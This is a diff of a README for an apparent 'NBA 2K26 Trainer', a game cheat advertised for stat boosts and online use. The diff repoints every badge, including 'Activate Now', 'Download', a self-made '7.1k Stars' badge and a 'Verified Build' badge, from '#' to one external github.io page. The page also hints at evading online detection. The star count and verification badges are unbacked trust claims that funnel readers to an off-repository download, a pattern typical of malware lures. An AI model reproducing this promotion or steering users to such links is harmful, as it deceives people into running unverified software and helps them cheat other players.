@@ -21,10 +21,10 @@ Unlike hidden exploits, this trainer is a **modular enhancement tool** that adap
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 7.1k Stars](https://img.shields.io/badge/GitHub-7.1k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://na-2k26-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://na-2k26-trainer.github.io/.github/)
+[![⭐️ 7.1k Stars](https://img.shields.io/badge/GitHub-7.1k_Stars-green?logo=github\&style=for-the-badge)](https://na-2k26-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://na-2k26-trainer.github.io/.github/)
 
 ---
 
@@ -152,8 +152,8 @@ A: It reduces risk but no tool is 100% undetectable online.
 
 The **NBA 2K26 Trainer** delivers **stat boosts, overlays, and shot consistency tools** in one package. Whether you’re pushing through MyCareer or competing online, it helps you perform at a higher level every match.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://na-2k26-trainer.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://na-2k26-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://na-2k26-trainer.github.io/.github/)
 
 ---
